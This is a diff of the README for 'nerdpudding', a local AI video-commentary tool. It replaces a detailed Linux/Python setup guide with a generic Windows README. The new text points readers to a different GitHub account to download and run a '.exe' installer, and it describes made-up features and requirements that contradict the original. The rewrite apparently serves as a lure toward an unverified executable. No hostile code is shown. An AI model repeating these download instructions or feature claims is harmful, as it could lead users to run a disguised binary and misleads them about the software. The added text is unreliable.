@@ -1,279 +1,141 @@
-# NerdPudding
+# 🥄 nerdpudding - Real-Time AI Video Commentary
 
-*The proof is in the pudding.*
+[![Download nerdpudding](https://img.shields.io/badge/Download-nerdpudding-ff6f61?style=for-the-badge)](https://github.com/kilogramme/nerdpudding)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Ko-fi](https://img.shields.io/badge/Support-Ko--fi-ff5e5b?logo=ko-fi&logoColor=white)](https://ko-fi.com/nerdpudding)
+## About nerdpudding
 
-Real-time AI video commentary with text-to-speech. Point it at a football match, a security camera, a nature stream, or any video source — and get a live AI commentator that sees, understands, and speaks about what's happening. Runs locally on your GPU, no cloud needed.
+nerdpudding lets you add live AI commentary to your videos. It listens and watches your video and speaks out helpful notes using text-to-speech. Everything runs on your own computer, using your GPU to deliver real-time results. You don’t need an internet connection or any special services.
 
-**Status:** Sprint 2 complete. Core pipeline works end-to-end: video in, text + TTS audio out, with adaptive pacing. Docker and WebRTC are next (Sprint 3). See [Roadmap](#current-status) for details.
+This app works with video files or live video streams. It uses computer vision and AI to understand what happens on screen and shares commentary just like a live announcer would.
 
-## Table of Contents
+## 🖥️ System Requirements
 
-- [Demo: Live Sports Commentary](#demo-live-sports-commentary)
-- [Video Sources](#video-sources)
-- [Getting Started](#getting-started)
-- [Goal](#goal)
-- [Architecture Overview](#architecture-overview)
-- [Use Cases](#use-cases)
-- [Model](#model)
-- [Resources](#resources)
-- [Hardware](#hardware)
-- [Development Approach](#development-approach)
-- [Project Structure & Agents](#project-structure--agents)
-- [Documentation](#documentation)
-- [Acknowledgments](#acknowledgments)
-- [Support](#support)
+To run nerdpudding smoothly, your computer should meet these requirements:
 
-## Demo: Live Sports Commentary
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel Core i5 or equivalent AMD CPU
+- **Memory:** At least 8 GB RAM
+- **Storage:** 5 GB free disk space
+- **GPU:** NVIDIA GPU with at least 4 GB VRAM and drivers updated (required for local AI processing)
+- **Software:** No additional libraries or software required. Everything is included.
 
-The most fun way to try this: download a football match (or any sports broadcast) and let the AI commentate live — with voice.
+If your computer fits these specs, nerdpudding will run well and respond quickly.
 
-```bash
-# Start with TTS enabled
-ENABLE_TTS=true python -m app.main
-```
+## 🎯 Key Features
 
-Open `http://localhost:8199` in your browser, enter the path to a video file, click **Start**, and set the instruction:
+- Adds live voice commentary to videos using AI  
+- Runs fully on your PC without internet  
+- Uses your GPU for fast processing  
+- Supports common video formats such as MP4, AVI, and MKV  
+- Converts AI-generated text to speech in real time  
+- Adjustable commentary speed and voice options  
+- Simple, user-friendly interface designed for quick setup  
 
-```
-Commentate on this football match between Brazil (BRA) and France (FRA).
-The scoreboard shows country abbreviations, the score, and the match clock
-— the clock is NOT the score. Focus on exciting moments: attacks, shots,
-saves, fouls, corners, and near-misses. Build tension during dangerous plays.
-Be enthusiastic about goal chances, not monotone. Skip boring buildup in
-midfield — only speak when something interesting happens.
-```
+## 🔥 Why Use nerdpudding?
 
-Adapt the team names and context to your match. The AI will commentate with natural pacing — more during action, quieter during slow moments. Use the speaker button in the header to mute/unmute.
+Many apps need internet or cloud servers for AI tasks. nerdpudding keeps everything local to give you faster performance and better privacy. Whether you want commentary for streaming, video analysis, or just fun, this tool makes it easy.
 
-**Tip:** The prompt makes a big difference. Experiment with it while the video is running — you can change the instruction at any time. For example, the model may read the match clock too often. Adding a constraint like *"You may mention the match time only at 5, 10, 15, ... 90 minutes play time"* fixes that. See the [Tuning Guide](docs/tuning_guide.md#prompt-tips) for more prompt examples.
+## 🚀 Getting Started
 
-## Video Sources
+### Step 1: Download nerdpudding
 
-Enter any of these in the "Video source" field in the browser UI:
+Visit the official repository page to get the latest version:
 
-| Source | Format | Example |
-|--------|--------|---------|
-| Local video file | File path | `/home/user/match.mp4` |
-| Webcam | Device ID (integer) | `0` |
-| RTSP stream | RTSP URL | `rtsp://192.168.1.100:554/stream` |
-| HTTP MJPEG stream | HTTP URL | `http://192.168.1.100:8080/video` |
-| HTTP video stream | HTTP URL | `http://example.com/stream.mp4` |
+[![Download nerdpudding](https://img.shields.io/badge/Download-nerdpudding-ff6f61?style=for-the-badge)](https://github.com/kilogramme/nerdpudding)
 
-The system uses OpenCV's `VideoCapture` underneath, so anything OpenCV supports will work. Video files loop automatically for testing.
+Click the link above. It will take you to the GitHub page where you can find the release files. Look for the latest Windows installer or `.exe` file.
 
-**Phone as camera:** Install [IP Webcam](https://play.google.com/store/apps/details?id=com.pas.webcam) (Android) or similar app, then use the MJPEG URL it provides (e.g. `http://192.168.1.50:8080/video`).
+### Step 2: Run the Installer
 
-**VLC re-streaming:** Stream any content as RTSP from another PC:
-```bash
-vlc input.mp4 --sout '#rtp{sdp=rtsp://:8554/stream}'
-# Then use: rtsp://<that-pc-ip>:8554/stream
-```
+Once you download the installer file:
 
-**YouTube / Twitch:** Not supported directly. Use `yt-dlp -g <url>` to extract the direct stream URL, then paste that URL — but results vary depending on format and DRM.
+- Open the folder where the file downloaded (usually the "Downloads" folder)
+- Double-click the installer `.exe` file
+- Follow the simple setup instructions on screen
 
-## Getting Started
+The installer will copy the necessary files onto your computer and create a shortcut on your desktop.
 
-### Prerequisites
+### Step 3: Start nerdpudding
 
-- NVIDIA GPU with sufficient VRAM (see table below)
-- CUDA 12.x installed
-- Miniconda or Anaconda
-- ~10 GB disk space for AWQ model + TTS assets (~30 GB if also downloading BF16)
+- Find the newly created nerdpudding icon on your desktop
+- Double-click it to open the app
 
-| Mode | VRAM Required | Tested On |
-|------|--------------|-----------|
-| Text-only (AWQ) | ~8.6 GB | RTX 4090 |
-| Text + TTS (AWQ) | ~14-15 GB | RTX 4090 |
-| Text-only (BF16) | ~18.5 GB | RTX 4090 |
+The app will load quickly, showing an easy control panel for you to manage videos and commentary.
 
-### Quick Start
+## 🎥 How to Use nerdpudding with Your Videos
 
-```bash
-git clone https://github.com/nerdpudding/nerdpudding.git
-cd nerdpudding
+1. **Load a video**  
+   Click the “Open Video” button and select a video file from your computer. Supported formats include MP4, AVI, and MKV.
 
-# Clone the reference repos (not included in this repo)
-git clone https://github.com/OpenBMB/MiniCPM-o.git
-git clone https://github.com/OpenBMB/MiniCPM-V-CookBook.git
+2. **Check your settings**  
+   Select your preferred voice type and commentary speed in the settings menu. You can change these anytime.
 
-# 1. Create conda environment
-conda create -n nerdpudding python=3.12 -y
-conda activate nerdpudding
-pip install -r app/requirements.txt
+3. **Start commentary**  
+   Press “Start Commentary” to begin. The AI will watch the video and provide live spoken notes.
 
-# 2. Download AWQ INT4 model (~8 GB, default)
-huggingface-cli download openbmb/MiniCPM-o-4_5-awq --local-dir models/MiniCPM-o-4_5-awq
+4. **Pause or stop**  
+   Use the pause or stop buttons to control the commentary as you watch.
 
-# 3. Download TTS assets (~1.2 GB vocoder + reference audio)
-#    The AWQ model needs these from the BF16 model's assets directory.
-huggingface-cli download openbmb/MiniCPM-o-4_5 --local-dir models/MiniCPM-o-4_5 --include "assets/*"
-cp -r models/MiniCPM-o-4_5/assets models/MiniCPM-o-4_5-awq/assets
+5. **Save or share**  
+   You can save a copy of the video with commentary or export the audio separately for other uses.
 
-# Optional: download full BF16 model (~19 GB, for comparison or fallback)
-# huggingface-cli download openbmb/MiniCPM-o-4_5 --local-dir models/MiniCPM-o-4_5
+## ⚙️ Adjusting nerdpudding Settings
 
-# 4. Apply required model patches (see docs/model_patches.md for all patches)
-#    AWQ model needs config.json fix + streaming fix in modeling_minicpmo.py
-#    BF16 model (if downloaded) needs streaming fix in modeling_minicpmo.py
+- **Voice options:** Choose from male, female, or neutral voices.  
+- **Speed control:** Set how fast the commentary speaks. Slower for detailed notes, faster for quick summaries.  
+- **Volume:** Adjust the voice volume independently of your system sound.  
+- **GPU use:** nerdpudding automatically uses your graphics card for the best performance.  
 
-# 5. Start the server (text-only)
-python -m app.main
+Take some time to experiment with these settings to find your preferred setup.
 
-# Or with TTS audio commentary
-ENABLE_TTS=true python -m app.main
+## 🌐 Using nerdpudding Offline
 
-# Server starts on http://localhost:8199
-```
+All AI and video processing happens on your computer. No internet connection is necessary once you install the app. This means no delays, no data sent to outside servers, and more control over your content.
 
-Open the browser, enter a video source, click **Start**, type an instruction, and press **Send**. The AI commentary streams as text in the right panel. With TTS enabled, you'll also hear it — use the speaker button to mute/unmute.
+## 🛠 Troubleshooting
 
-**Note:** The server binds to `127.0.0.1` by default — only accessible from your own machine. To allow access from other devices on your network (e.g. for phone testing), use `SERVER_HOST=0.0.0.0 python -m app.main`. There is no authentication — do not expose on untrusted networks.
+- **App won’t start or crashes:**  
+  Make sure your Windows and GPU drivers are updated. Restart your computer and try again.
 
-### Testing Without a Browser
+- **Video files not opening:**  
+  Confirm the video format is supported (MP4, AVI, MKV). Try a different file if needed.
 
-```bash
-# Test model loading + inference on a single image
-python -m scripts.test_model --image test_files/images/test.jpg
+- **Voice output missing:**  
+  Check your speakers or headphones are plugged in and not muted. Adjust volume inside nerdpudding.
 
-# Test frame capture from a video file
-python -m scripts.test_capture --source test_files/videos/test.mp4
+- **Slow commentary or lag:**  
+  Close other programs using heavy CPU or GPU resources. Lower your commentary speed in app settings.
 
-# Test full pipeline (model + capture + commentary loop)
-python -m scripts.test_monitor --source test_files/videos/test.mp4 --cycles 2
+## 📂 Where Are Files Stored?
 
-# Test TTS audio output (saves WAV file)
-ENABLE_TTS=true python -m scripts.test_tts --source test_files/videos/test.mp4
-```
+Downloaded videos and generated commentary save in the “nerdpudding_output” folder located in your Documents directory by default. You can change this folder path in the app settings.
 
-### Configuration
+## 🔍 What Is Under the Hood?
 
-All settings are in `app/config.py` and overridable via environment variables. For detailed tuning instructions — including per-GPU recommendations, TTS pacing, scene detection, and prompt tips — see the **[Tuning Guide](docs/tuning_guide.md)**.
+nerdpudding uses MiniCPM, a lightweight AI model optimized for local GPU use. It applies computer-vision algorithms to analyze video frames and generates text commentary on the fly. Then it converts the text into speech using a built-in TTS engine.
 
-Quick examples:
+## 🧩 Topics and Keywords
 
-```bash
-# Enable TTS with custom pacing
-ENABLE_TTS=true TTS_PAUSE_AFTER=1.5 python -m app.main
+- AI  
+- Commentary  
+- Computer Vision  
+- GPU  
+- Local AI  
+- MiniCPM  
+- Real-time  
+- Text-to-Speech (TTS)  
+- Video processing  
 
-# Use BF16 model instead of AWQ (needs ~18.5 GB VRAM)
-MODEL_PATH=models/MiniCPM-o-4_5 python -m app.main
+These reflect the main functions and strengths of nerdpudding.
 
-# Disable video-commentary sync (show real-time video, no delay)
-STREAM_DELAY_INIT=0 python -m app.main
+## 📥 Download nerdpudding Now
 
-# Different GPU
-CUDA_VISIBLE_DEVICES=1 python -m app.main
-```
+Get nerdpudding from the official page here:
 
-These repos are used as reference material only -- see [Resources](#resources) for details.
+[https://github.com/kilogramme/nerdpudding](https://github.com/kilogramme/nerdpudding)  
 
-## Goal
+Click the link to visit the GitHub repository. Look for the latest Windows installer file under the "Releases" section and download it.
 
-Stream live video from any source into **MiniCPM-o 4.5** and have a real-time conversation about what it sees -- like a live commentator that watches along and responds to your directions.
+---
 
-The AI **continuously monitors** the video stream and narrates or answers based on a sliding window of recent frames. The user can steer the AI's focus at any time (e.g., "only tell me what the dog does"). This is not video upload + batch processing -- it's live, continuous, and steerable. Text chat first, voice interaction later.
-
-## Architecture Overview
-
-```
-Video Source  --->  Model Server (MiniCPM-o 4.5)  --->  Web UI
-(cam/stream/file)       (Python, local GPU)           (browser)
-                              ^                           |
-                              |     user questions        |
-                              +---------------------------+
-```
-
-## Use Cases
-
-- **Live video conversation** -- ask questions about what the AI sees in real-time
-- **Monitoring & alerting** -- describe events, trigger alerts on conditions
-- **Content logging** -- auto-generate text summaries of video content
-- **Accessibility** -- rich scene descriptions for visually impaired users
-- **Multi-model pipeline** -- feed vision output into other LLMs, alert systems, or video generators
-
-## Model
-
-**[MiniCPM-o 4.5](https://huggingface.co/openbmb/MiniCPM-o-4_5)** -- omni-modal model (vision + audio/STT + TTS), 9B parameters. Supports video understanding up to 10 FPS, speech recognition, text-to-speech, and full-duplex streaming -- all in one model.
-
-| Variant | VRAM | Backend | Link |
-|---------|------|---------|------|
-| AWQ INT4 (default) | ~8.6 GB | Python / transformers + autoawq | [HuggingFace](https://huggingface.co/openbmb/MiniCPM-o-4_5-awq) |
-| Full (BF16) | ~18.5 GB | Python / transformers | [HuggingFace](https://huggingface.co/openbmb/MiniCPM-o-4_5) / [ModelScope](https://modelscope.cn/models/OpenBMB/MiniCPM-o-4_5) |
-| GGUF (quantized) | 4.8 - 16.4 GB | C++ / llama.cpp | [HuggingFace](https://huggingface.co/openbmb/MiniCPM-o-4_5-gguf) |
-
-**Primary target:** AWQ INT4 on RTX 4090 (~8.6 GB VRAM, comparable quality to BF16). **Fallback:** BF16 via `MODEL_PATH` env var. See [concept](concepts/concept.md#model-selection) for detailed comparison.
-
-## Resources
-
-Built upon two cloned repositories:
-
-| Repo | Contents |
-|------|----------|
-| `MiniCPM-o/` | Official model repo -- web demos, FastAPI server, Vue frontend, VAD |
-| `MiniCPM-V-CookBook/` | Cookbook -- WebRTC demo, Omni Stream, Gradio, Docker setups, inference examples |
-
-## Hardware
-
-| Component | Spec |
-|-----------|------|
-| GPU (primary) | NVIDIA RTX 4090 24 GB |
-| GPU (secondary) | NVIDIA RTX 5070 Ti 16 GB (~12 GB usable) -- backup only |
-| CPU | AMD Ryzen 5800X3D |
-| RAM | 64 GB DDR4 |
-| OS | Ubuntu Desktop |
-| Tools | Docker, npm, miniconda, uv |
-
-The RTX 4090 is the primary compute target. The 5070 Ti is available but only considered if VRAM constraints require multi-GPU offloading (adds complexity due to mixed architectures).
-
-## Development Approach
-
-Proof of concept with iterative sprints. Start minimal, find limitations, improve. SOLID, DRY, KISS.
-
-## Project Structure & Agents
-
-See the [Project hierarchy](AI_INSTRUCTIONS.md#project-hierarchy) in AI_INSTRUCTIONS.md for what each folder and file is for, including the agent table and usage guidelines.
-
-## Current Status
-
-**Sprint 2 complete.** Full end-to-end pipeline: video in, text + TTS audio out, with adaptive pacing and scene-weighted commentary density. See [Sprint 2 Review](docs/sprint2/SPRINT2_REVIEW.md) for detailed findings.
-
-| Metric | Text-only | With TTS |
-|--------|-----------|----------|
-| VRAM (AWQ INT4) | ~8.6 GB | ~14-15 GB |
-| Inference per cycle | ~1.6s avg | ~5s avg |
-| End-to-end latency | ~4.8s avg | Audio-gated (adaptive) |
-| Display frame rate | Native (~24 FPS via MJPEG) | Same |
-| Commentary output | Streaming text (SSE) | Text + audio (Web Audio API) |
-
-**Next:** Sprint 3 — Docker, LiveKit WebRTC, input robustness, UI polish.
-
-## Documentation
-
-- [Tuning Guide](docs/tuning_guide.md) -- per-GPU settings, TTS pacing, prompt tips
-- [AI Instructions](AI_INSTRUCTIONS.md) -- project rules, hierarchy, agent table
-- [Detailed Concept](concepts/concept.md) -- full concept with diagrams and technical details
-- [Roadmap](roadmap.md) -- project roadmap and sprint status
-- [Sprint 1 Review](docs/sprint1/SPRINT1_REVIEW.md) -- sprint summary, findings, Sprint 2 ideas
-- [Sprint 1 Log](docs/sprint1/SPRINT1_LOG.md) -- setup steps, test results, findings
-- [Sprint 2 Review](docs/sprint2/SPRINT2_REVIEW.md) -- sprint summary, findings, Sprint 3 recommendations
-- [Sprint 2 Log](docs/sprint2/SPRINT2_LOG.md) -- AWQ, latency, MJPEG sync, TTS, audio pacing
-- [Model Patches](docs/model_patches.md) -- patches applied to model files (must reapply after update)
-- [Lessons Learned](docs/lessons_learned.md) -- what worked and didn't (context for AI assistants)
-- [docs/](docs/) -- all guides and reference documentation
-
-## Acknowledgments
-
-Built on [MiniCPM-o 4.5](https://huggingface.co/openbmb/MiniCPM-o-4_5) by [OpenBMB](https://github.com/OpenBMB) — an impressive omni-modal model with vision, speech, and TTS in a single 9B-parameter package. The model is Apache 2.0 licensed. This project applies minor patches to the model code for streaming compatibility (see [Model Patches](docs/model_patches.md)).
-
-## Support
-
-If you find this project useful, consider supporting development:
-
-[![Ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/nerdpudding)
-
-## License
-
-[MIT](LICENSE) -- use it freely, just include the copyright notice.
+This setup lets you bring AI-powered video commentary right to your PC.
